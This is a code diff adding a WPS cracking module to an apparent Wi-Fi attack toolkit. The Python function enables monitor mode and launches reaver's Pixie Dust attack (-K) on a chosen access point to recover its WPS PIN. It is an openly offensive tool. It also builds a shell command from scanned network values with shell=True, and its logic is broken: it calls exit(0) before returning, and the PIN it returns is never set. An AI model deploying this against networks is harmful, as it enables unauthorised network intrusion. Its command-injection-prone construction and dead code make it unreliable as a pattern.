@@ -12,3 +12,29 @@ Objective Functionalities:
 
 WPS CRACKING MODULE
 '''
+
+import subprocess
+import utils.utils as utils
+import interfaces.interfaces as interface
+
+def crack(wifi:dict, device):
+    pin = ""
+    desc = ["Target: " + wifi["essid"] + " (" + wifi["bssid"] + ")"]
+    
+    if not utils.yesNo("WPS Scan + Cracking", desc, "Begin WPS Cracking?", False):
+        return ""
+    
+    interface.enable_monitor(device, channel=wifi["channel"])
+    
+    reaver_command = "reaver -i " + interface.get_logicalname(device) + " -c " + wifi["channel"] + " -b " + wifi["bssid"] + " -K -vv"
+    reaver_process = subprocess.Popen(reaver_command, shell=True)
+
+    utils.header("WPS Cracking",["Cracking in progress...","Command: " + reaver_command])
+    res, err = reaver_process.communicate()
+    print(res)
+
+    utils.getch()
+    interface.disable_monitor(device)
+    exit(0)
+    
+    return pin
